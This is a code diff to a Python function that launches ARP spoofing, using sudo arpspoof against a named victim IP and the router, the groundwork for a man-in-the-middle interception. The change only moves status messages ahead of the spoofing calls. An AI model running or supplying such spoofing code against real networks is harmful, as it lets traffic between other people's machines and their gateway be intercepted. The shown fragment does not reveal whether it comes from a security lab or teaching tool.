@@ -29,16 +29,16 @@ def run_arpspoof(victim_ip, router_ip, iface="eth0", target_victim=True):
         with open(os.devnull, 'w') as devnull:
             if target_victim:
                 # Step 1: Send ARP reply to the victim (spoofing the router)
+                print(
+                    f"[*] Sending ARP reply to victim {victim_ip} (pretending to be {router_ip}).")
                 subprocess.run(["sudo", "arpspoof", "-i", iface, "-t", victim_ip, router_ip],
                                stdout=devnull, stderr=devnull, check=True)
-                print(
-                    f"[*] Sent ARP reply to victim {victim_ip} (pretending to be {router_ip}).")
             else:
                 # Step 2: Send ARP reply to the router (spoofing the victim)
+                print(
+                    f"[*] Sending ARP reply to router {router_ip} (pretending to be {victim_ip}).")
                 subprocess.run(["sudo", "arpspoof", "-i", iface, "-t", router_ip, victim_ip],
                                stdout=devnull, stderr=devnull, check=True)
-                print(
-                    f"[*] Sent ARP reply to router {router_ip} (pretending to be {victim_ip}).")
 
     except subprocess.CalledProcessError as e:
         print(f"[!] Failed to execute arpspoof: {e}")
